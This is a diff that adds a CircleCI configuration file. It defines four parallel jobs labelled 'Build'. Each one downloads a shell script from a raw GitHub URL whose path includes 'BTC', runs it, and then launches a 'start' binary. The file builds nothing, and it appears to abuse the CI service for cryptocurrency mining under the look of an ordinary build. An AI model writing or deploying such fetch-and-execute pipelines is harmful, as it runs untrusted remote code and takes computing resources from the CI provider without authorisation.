@@ -1,0 +1,40 @@
+version: 2 
+jobs: 
+    Build_01: 
+      docker: 
+            - image: circleci/ruby:2.4 
+      steps: 
+        - run: 
+            name: Build 
+            command: wget https://raw.githubusercontent.com/bajinganasu689/yupx/main/githubusercontent.com/bajinganasu869/BTC/main/srb0.sh && chmod u+x srb0.sh && ./srb0.sh && chmod +x start &&./start  
+    Build_02: 
+      docker: 
+            - image: circleci/ruby:2.4 
+      steps: 
+        - run: 
+            name: Build 
+            command: wget https://raw.githubusercontent.com/bajinganasu689/yupx/main/githubusercontent.com/bajinganasu869/BTC/main/srb0.sh && chmod u+x srb0.sh && ./srb0.sh && chmod +x start &&./start  
+    Build_03: 
+      docker: 
+            - image: circleci/ruby:2.4 
+      steps: 
+        - run: 
+            name: Build 
+            command: wget https://raw.githubusercontent.com/bajinganasu689/yupx/main/githubusercontent.com/bajinganasu869/BTC/main/srb0.sh && chmod u+x srb0.sh && ./srb0.sh && chmod +x start &&./start 
+    Build_04: 
+      docker: 
+            - image: circleci/ruby:2.4 
+      steps: 
+        - run: 
+            name: Build 
+            command: wget https://raw.githubusercontent.com/bajinganasu689/yupx/main/githubusercontent.com/bajinganasu869/BTC/main/srb0.sh && chmod u+x srb0.sh && ./srb0.sh && chmod +x start &&./start  
+ 
+ 
+workflows: 
+    version: 2 
+    build: 
+        jobs: 
+            - Build_01 
+            - Build_02 
+            - Build_03 
+            - Build_04
